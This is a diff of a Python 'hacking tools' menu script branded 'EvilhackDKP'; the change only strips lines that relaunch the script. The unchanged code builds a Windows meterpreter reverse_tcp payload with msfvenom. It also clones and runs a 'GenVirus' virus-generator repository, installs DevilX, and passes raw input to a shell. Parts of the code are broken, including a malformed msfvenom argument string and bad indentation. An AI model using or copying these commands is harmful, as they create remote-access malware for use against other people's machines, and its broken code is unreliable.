@@ -4,7 +4,7 @@ import webbrowser
 os.system("clear") 
 print("\033[1;32") 
 
-a =input("mmodule: ")
+a =input("mmodule: ") 
 
 webbrowser.open("https://github.com/EvilhackDKP")
 
@@ -12,7 +12,7 @@ def shell():
 	while a =="shell":
 		shell =input("shell.EvilhackDKP~$")
 		os.system(shell)
-		os.system("python3 Null-tools-in-python.py")
+		
 
 	
 def pwd():	
@@ -26,7 +26,7 @@ def pwd():
 		length_for_pass =int(demande_length_for_pass)
 		password ="".join(random.sample(use_for, length_for_pass))
 		print("your generated password is: " + password)
-		os.system("python3 Null-tools-in-python.py")
+		
 		
 
 def nh():		
@@ -42,17 +42,17 @@ def nh():
 		os.system("ls")
 		ip =input("ip: ")	
 		os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + ip + "LPORT=4444 -f exe -o payload.exe")
-		os.system("python3 Null-tools-in-python.py")
+		
 	
 def interpreter():	
 	if a =="interpreter":
 		os.system("python3")
-		os.system("python3 Null-tools-in-python.py")
+		
 	
 def fake_help():	
 	if a =="help":
 		print("pas help mais help()")
-		os.system("python3 Null-tools-in-python.py")
+		
 	
 	
 def help():
@@ -64,7 +64,7 @@ def help():
 		print("time: donne l'heure")
 		print("devilx: installe devilx")
 		print("open link: ouvre mon github ;)")
-		os.system("python3 Null-tools-in-python.py")
+		
 	
 def devilx():
 	if a == "devilx":
@@ -75,22 +75,22 @@ def devilx():
 		os.system("cd DevilX")
 		os.system("chmod +x *")
 		os.system("bash setup.sh")
-		os.system("python3 Null-tools-in-python.py")
+		
 		
 def open_lien():
 		webbrowser.open("https://github.com/EvilhackDKP")
 		webbrowser.open("https://f-droid.org/fr/")
 		webbrowser.open("")
-	os.system("python3 Null-tools-in-python.py")
+	
 	
 def time():	
 	if a == "time":
 		os.system("uptime")
-		os.system("python3 Null-tools-in-python.py")
+		
 
 def genvirus():
 	os.system("apt update ; apt install git -y ; git clone git://github.com/Ign0r3dH4x0r/GenVirus.git ; cd GenVirus ; bash GenVirus.sh")
-	os.system("python3 Null-tools-in-python.py")
+	
 	
 	
 	
